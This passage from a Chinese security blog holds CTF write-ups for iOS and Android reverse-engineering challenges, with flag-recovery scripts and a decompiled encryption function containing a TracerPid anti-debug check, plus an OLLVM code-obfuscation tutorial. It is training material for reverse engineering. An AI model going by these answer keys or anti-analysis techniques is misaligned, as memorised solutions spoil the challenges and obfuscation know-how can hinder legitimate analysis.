src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359022952-2c194e4b-5826-4215-aeaa-ec251fcf5e4e.png" class="" title="img"><p>如果有环境的话可以直接把这个 dylib 拷贝到 &#x2F;Library&#x2F;MobileSubstrate&#x2F;DynamicLibraries&#x2F; 目录下，让程序运行的时候加载</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359817979-e45b0b56-695b-480d-b90d-697c4ff4e5d3.png" class="" title="img"><p>我这里没有环境，选择直接分析程序，首先获取并加载图片</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360014845-d896b9cb-bad2-4722-9e4d-1c0e73e027c0.png" class="" title="img"><p>取前 32 个字节中下标为奇数的字节，将 v6 的前16字符替换成混淆后的 v10</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360086304-05268bf9-e38d-4924-b455-f90a1a13ee6d.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">byte_7FA0 = [<br>    <span class="hljs-number">0x06</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x45</span>,<br>    <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x4B</span><br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_custom_string</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read(<span class="hljs-number">32</span>)<br><br>    filtered = [data[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>)]<br>    hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> filtered)<br><br>    transformed = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        orig_char = <span class="hljs-built_in">ord</span>(hex_str[i])<br>        xor_char = byte_7FA0[i] ^ orig_char<br>        transformed += <span class="hljs-built_in">chr</span>(xor_char)<br><br>    final_str = transformed + hex_str[<span class="hljs-number">16</span>:]<br>    <span class="hljs-keyword">return</span> final_str<br><br>result = generate_custom_string(<span class="hljs-string">&quot;flag_in_secret_.jpg&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#by_7he0s_ho0k_ls4800e1647866004d</span><br></code></pre></td></tr></table></figure><p>后16位相互异或+5之后等于密文key</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360744354-67fc7451-e0cf-4bf9-bf79-8fecc90b5469.png" class="" title="img"><p>密文只有14位，猜测10和8重复出现</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360625386-9073ffa2-2f72-4b57-9e1c-3a3ce0206c46.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">p1=<span class="hljs-string">&#x27;by_7he0s_ho0k_ls&#x27;</span><br>pd=<span class="hljs-string">&#x27;4800e1647866004d&#x27;</span><br>tmp=<span class="hljs-string">&#x27;&#x27;</span><br>key=[<span class="hljs-number">112</span>,<span class="hljs-number">16</span>,<span class="hljs-number">86</span>,<span class="hljs-number">72</span>,<span class="hljs-number">33</span>,<span class="hljs-number">115</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">16</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">19</span>,<span class="hljs-number">82</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    tmp+=<span class="hljs-built_in">chr</span>((key[i]-<span class="hljs-number">5</span>)^<span class="hljs-built_in">ord</span>(pd[i]))<br><span class="hljs-built_in">print</span>(p1+tmp)<br><span class="hljs-comment">#by_7he0s_ho0k_ls_3asy_23333333:)</span><br></code></pre></td></tr></table></figure><p>超出部分用flag包裹即可</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744361089049-a1cec87b-1325-452f-beb9-ae0218a1efcb.png" class="" title="img"><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag&#123;<span class="hljs-meta">by</span><span class="hljs-number">_7</span>he<span class="hljs-number">0</span>s<span class="hljs-number">_</span>ho<span class="hljs-number">0k</span><span class="hljs-number">_</span>ls<span class="hljs-number">_3</span>asy<span class="hljs-number">_23333333</span>:)&#125;<br></code></pre></td></tr></table></figure><p>练习题：<a href="https://ivrodriguez.com/mobile-ctf/">https://ivrodriguez.com/mobile-ctf/</a></p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OLLVM混淆so文件初探</title>
    <link href="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/"/>
    <url>/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>LLVM 是一个开源的编译器基础架构，广泛应用于编译器和程序分析</p><p>LLVM 的核心组件：</p><ul><li>LLVM Core Libraries：提供用于编译器开发的核心工具集，包括代码生成、优化、目标机器描述等</li><li>Clang：一个基于 LLVM 的 C、C++、Objective-C 编译器前端</li><li>LLVM IR（Intermediate Representatio n）：一种类似汇编的中间表示语言，是 LLVM 的核心抽象。代码在编译过程中先被转换为 LLVM IR，随后进行各种优化，再生成目标机器码</li><li>LLVM Optimizer：对 LLVM IR 进行各种优化，如循环优化、内联展开等，以提升性能</li><li>LLVM Code Generator：将优化后的 LLVM IR 转换为特定平台的机器码</li><li>Linker：LLVM 也包含了一些链接器工具（如 LLD），用于将编译好的目标文件链接成可执行文件或库</li></ul><p>自 Android NDK r18 开始，Google 弃用了 GCC，全面转向使用 LLVM&#x2F;Clang 作为 NDK 的编译工具链，Clang 作为 C&#x2F;C++ 的编译前端，负责将 C&#x2F;C++ 代码编译为 LLVM IR</p><p>OLLVM 是 LLVM 的一个分支，增加了代码混淆功能（如控制流平坦化、指令替换），主要用于保护二进制代码的安全性</p><h1 id="编译ollvm"><a href="#编译ollvm" class="headerlink" title="编译ollvm"></a>编译ollvm</h1><p>直接的ollvm-4.0版本太旧，于是选择下载llvm源码进行编译</p><p>复制obfuscation等文件之后再次编译</p><p>一开始尝试用ninja构建</p><p>cmake -G “Ninja” -DCMAKE_BUILD_TYPE&#x3D;Release -DLLVM_ENABLE_PROJECTS&#x3D;”llvm;clang;lld”                -DLLVM_ENABLE_RTTI&#x3D;OFF -DLLVM_ENABLE_EH&#x3D;OFF ..&#x2F;llvm</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743159822205-8b0f9a87-25e7-4207-8435-96f0e09a7b96.png" class="" title="img"><p>增加ollvm相关内容后再次编译有报错，不知道为什么在用本地的MinGW-w64编译导致报错</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743216809784-970daca6-070d-4a82-902a-733d127254df.png" class="" title="img"><p>要不然就得重新用Visual Studio编译</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743493783240-bbebed05-923e-4fc0-bfe1-3d153830ad38.png" class="" title="img"><p>这里还有一种方法就是找已经编译好的，只要与需要的版本相近，可以去github找或者直接在浏览器搜索</p><p>我后面就是直接用的编译好的ollvm</p><p><a href="https://www.bilibili.com/opus/943544163969794072">构建含有ollvm功能的LLVM(clang-cl)供Microsoft Visual Studio 2022使用 - 哔哩哔哩</a></p><p>相关的选项</p><p><a href="https://github.com/HikariObfuscator/Hikari/wiki/Usage">https://github.com/HikariObfuscator/Hikari/wiki/Usage</a></p><h1 id="功能与使用"><a href="#功能与使用" class="headerlink" title="功能与使用"></a>功能与使用</h1><p>不同ollvm选项稍有不同，但大致如下</p><ul><li>控制流扁平化（-mllvm -fla）：通过扁平化控制流，使代码的执行路径变得复杂且难以理解，从而增加逆向工程的难度</li><li>指令替换（-mllvm -sub）：用等效但不同的指令序列替换原有指令，增加代码阅读和分析的复杂度</li><li>虚假控制流程（-mllvm -bcf）：在代码中插入虚假的控制流和逻辑，使得代码看起来混乱且难以推理</li><li>字符串加密（-mllvm -sobf）：对字符串进行加密处理，防止字符串在二进制文件中被轻易识别和解析</li></ul><p>测试代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> sum;<br><br>    <span class="hljs-comment">// 执行加法运算</span><br>    sum = a + b;<br><br>    <span class="hljs-comment">// 输出运算结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result: %d + %d = %d\n&quot;</span>, a, b, sum);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>没加任何混淆</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743493976430-d178aa19-d08e-4de9-9216-f78fd3ae6514.png" class="" title="img"><p>.\clang.exe add.c -o add.exe  -mllvm -enable-allobf  -mllvm -bcf_prob&#x3D;100</p><p>使用混淆出现一万多行的代码以及极其复杂的流程图，这效果看上去就不错</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494028604-ba709fbb-a98f-4877-9527-29fe9616380f.png" class="" title="img"><p>在Android Studio的CMakeList.txt中添加选项</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494085671-07f42b74-8ede-447a-a2f8-b85f3940f497.png" class="" title="img"><p>最后达到了一定的混淆效果：流程图改变&#x2F;程序逻辑混乱+存在虚假代码+关键算法混淆</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494143067-8b1120f1-bd58-4439-9718-d2c57d0f9901.png" class="" title="img"><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494357728-8d6d0dd5-f0ab-491d-96fe-ff9e2a6b8c69.png" class="" title="img"><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494446126-6b989a00-66fa-40af-9d35-f236f7ef359f.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>作业与项目总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025数字中国APP赛道安全积分争夺赛初赛wp</title>
    <link href="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="app4"><a href="#app4" class="headerlink" title="app4"></a>app4</h1><p>手快抢了个签到题一血</p><p>有混淆，用jeb查看代码</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253539772-37349d34-0eaf-455c-9d1c-f166921c038f.png" class="" title="img"><p>发现有md5常数，猜测直接是md5</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253522707-d00448e7-c96b-4b71-9339-03e6311e1b37.png" class="" title="img"><p>在线得到flag</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253576206-6753ef22-0c11-4c71-a0f6-72070b834a3e.png" class="" title="img"><h1 id="babyapk"><a href="#babyapk" class="headerlink" title="babyapk"></a>babyapk</h1><p>baby_xor函数在so层</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253637828-60979be7-f55a-45b4-842d-9d32fce305ba.png" class="" title="img"><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743219875403-6d403ec7-e9de-4f38-b06a-6dabf1dbda54.png" class="" title="img"><p>用给的key解密发现一直不对，也没找到交叉引用</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253687445-844edbd1-88bc-4656-b473-2c63f73d7fd6.png" class="" title="img"><p>init_array找到修改点</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253747717-879d4c13-41a4-4359-8ab1-69ce0e2fef34.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">c=[<span class="hljs-number">119</span>, <span class="hljs-number">9</span>, <span class="hljs-number">40</span>, <span class="hljs-number">44</span>, <span class="hljs-number">106</span>, <span class="hljs-number">84</span>, <span class="hljs-number">113</span>, <span class="hljs-number">124</span>, <span class="hljs-number">34</span>, <span class="hljs-number">93</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">119</span>, <span class="hljs-number">4</span>, <span class="hljs-number">120</span>, <span class="hljs-number">124</span>, <span class="hljs-number">36</span>, <span class="hljs-number">7</span>, <span class="hljs-number">127</span>, <span class="hljs-number">42</span>, <span class="hljs-number">117</span>, <span class="hljs-number">6</span>, <span class="hljs-number">112</span>, <span class="hljs-number">41</span>, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>, <span class="hljs-number">112</span>, <span class="hljs-number">47</span>, <span class="hljs-number">119</span>, <span class="hljs-number">81</span>, <span class="hljs-number">123</span>, <span class="hljs-number">47</span>, <span class="hljs-number">33</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">120</span>, <span class="hljs-number">114</span>, <span class="hljs-number">24</span>]<br>c1=[<span class="hljs-number">0x11</span>,<span class="hljs-number">0x65</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4b</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    c[i]^=c1[i%<span class="hljs-built_in">len</span>(c1)]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(c[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#flag&#123;1873832fa175b6adc9b1a9df42d04a3c&#125;</span><br></code></pre></td></tr></table></figure><h1 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h1><p>两次encrypt</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255335798-ff5706fd-46ac-4355-861a-908666ee90d7.png" class="" title="img"><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255207027-49f6d832-a9f1-4c53-a075-7ebc5cabfac1.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">encrypt</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+2Fh] [rbp-651h]</span><br>  FILE *v5; <span class="hljs-comment">// [rsp+30h] [rbp-650h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+38h] [rbp-648h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+44h] [rbp-63Ch]</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+48h] [rbp-638h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4Ch] [rbp-634h]</span><br>  <span class="hljs-type">unsigned</span> __int8 *v10; <span class="hljs-comment">// [rsp+50h] [rbp-630h]</span><br>  <span class="hljs-type">unsigned</span> __int8 *StringUTFChars; <span class="hljs-comment">// [rsp+58h] [rbp-628h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [rsp+148h] [rbp-538h] BYREF</span><br>  <span class="hljs-type">socklen_t</span> addr_len; <span class="hljs-comment">// [rsp+14Ch] [rbp-534h] BYREF</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [rsp+150h] [rbp-530h] BYREF</span><br>  <span class="hljs-type">char</span> v15[<span class="hljs-number">246</span>]; <span class="hljs-comment">// [rsp+15Ah] [rbp-526h] BYREF</span><br>  <span class="hljs-type">char</span> v16[<span class="hljs-number">1032</span>]; <span class="hljs-comment">// [rsp+250h] [rbp-430h] BYREF</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">v17</span>;</span> <span class="hljs-comment">// [rsp+658h] [rbp-28h] BYREF</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">addr</span>;</span> <span class="hljs-comment">// [rsp+668h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v19; <span class="hljs-comment">// [rsp+678h] [rbp-8h]</span><br><br>  v19 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  StringUTFChars = (<span class="hljs-type">unsigned</span> __int8 *)_JNIEnv::GetStringUTFChars(a1, a3, <span class="hljs-number">0LL</span>);<br>  v10 = (<span class="hljs-type">unsigned</span> __int8 *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  addr_len = <span class="hljs-number">16</span>;<br>  fd = socket(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP socket creation failed&quot;</span>);<br>  addr.sa_family = <span class="hljs-number">2</span>;<br>  addr.sa_data[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>  *(_WORD *)&amp;addr.sa_data[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(addr.sa_data, <span class="hljs-string">&quot;09&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( bind(fd, &amp;addr, <span class="hljs-number">0x10</span>u) )<br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP bind failed&quot;</span>);<br>    close(fd);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( listen(fd, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP listen failed&quot;</span>);<br>    close(fd);<br>  &#125;<br>  __android_log_print(<span class="hljs-number">3LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP Server listening on port %d...&quot;</span>, <span class="hljs-number">12345LL</span>);<br>  v7 = accept(fd, &amp;v17, &amp;addr_len);<br>  <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP accept failed&quot;</span>);<br>    close(fd);<br>  &#125;<br>  v6 = __recvfrom_chk((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v7, key, <span class="hljs-number">16LL</span>, <span class="hljs-number">17LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( v6 &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    v16[v6] = <span class="hljs-number">0</span>;<br>    __android_log_print(<span class="hljs-number">3LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP Received: %s&quot;</span>, v16);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP recv failed&quot;</span>);<br>  &#125;<br>  close(v7);<br>  close(fd);<br>  v5 = fopen(<span class="hljs-string">&quot;/proc/self/status&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( __fgets_chk(s1, <span class="hljs-number">256LL</span>, v5, <span class="hljs-number">256LL</span>) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;TracerPid:&quot;</span>, <span class="hljs-number">0xA</span>uLL) )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(v15, <span class="hljs-string">&quot;%d&quot;</span>, &amp;v12);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  fclose(v5);<br>  v4 = v12;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i )<br>  &#123;<br>    v4 = sub_2AC0(v4);<br>    key[i] ^= v4;<br>  &#125;<br>  aesEncrypt(key, <span class="hljs-number">0x10</span>u, StringUTFChars, v10, <span class="hljs-number">0x10</span>u);<br>  __memcpy_chk(&amp;data, v10, <span class="hljs-number">16LL</span>, <span class="hljs-number">25LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据代码找到原始key</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253324744-0d359a06-bfac-452c-a422-e1b35e427368.png" class="" title="img"><p>模拟异或得到真正的key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x12</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x72</span>,<span 